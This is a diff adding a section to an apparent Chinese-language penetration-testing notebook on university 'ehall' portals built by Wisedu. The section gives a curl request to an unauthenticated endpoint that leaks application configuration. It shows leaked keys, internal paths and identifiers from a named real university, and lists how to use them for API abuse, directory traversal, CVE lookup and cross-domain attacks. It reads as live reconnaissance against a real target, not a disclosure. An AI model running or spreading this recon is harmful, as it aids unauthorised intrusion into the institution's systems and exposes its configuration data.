@@ -87,6 +87,48 @@ curl -sk "https://ehall.xxx.edu.cn/jsonp/school.json"
 - 在已知appId附近暴力枚举(+/-200)未发现新应用
 - 结论: 未登录状态下只能获取游客可见应用的appId
 
+### /jsonp/appInfo.json — 应用配置泄露 (gxnu.edu.cn 2026-06-09)
+
+```bash
+# 获取应用详细配置
+curl -sk "http://ehall.{domain}/jsonp/appInfo.json?appId={appId}"
+```
+
+**泄露内容:**
+- 应用ID (appId)
+- 应用密钥 (appKey): `{appId}-{version}` 格式
+- 部署路径 (deployPrefix): `http://ehall.{domain}/{appPath}`
+- 内部入口URL (entranceUrl): `/sys/{appName}/*default/index.do`
+- 认证URL (authUrl): `/sys/funauthapp/qxgl.do?appName={appName}&appId={appId}&min=1`
+- 供应商 (vendorName): 通常为"金智教育"
+- 版本号 (version): 如 `4.0.11_TR1`
+- 域ID (domainId): UUID格式
+- 上线时间 (onlineTime)
+- 权限配置: viewAuth(查看权限), accessAuth(访问权限)
+
+**实战案例 (gxnu.edu.cn):**
+```json
+{
+  "appId": "4834312099124186",
+  "appName": "学工流程管理",
+  "appKey": "4834312099124186-4.0.11_TR1",
+  "deployPrefix": "http://ehall.gxnu.edu.cn/xsfw",
+  "entranceUrl": "/sys/stateapp/*default/index.do",
+  "authUrl": "/sys/funauthapp/qxgl.do?appName=stateapp&appId=4834312099124186&min=1",
+  "vendorName": "金智教育",
+  "domainId": "8888429c-73bd-4c3d-b8cb-a74c18a9e376",
+  "version": "4.0.11_TR1",
+  "viewAuth": 0,
+  "accessAuth": 1
+}
+```
+
+**利用价值:**
+- 应用密钥可用于API调用
+- 内部路径可用于目录遍历和进一步测试
+- 供应商+版本可用于搜索已知CVE
+- 域ID可能用于跨域攻击
+
 ## 应用路径模式
 
 ehall下的应用通常部署在:
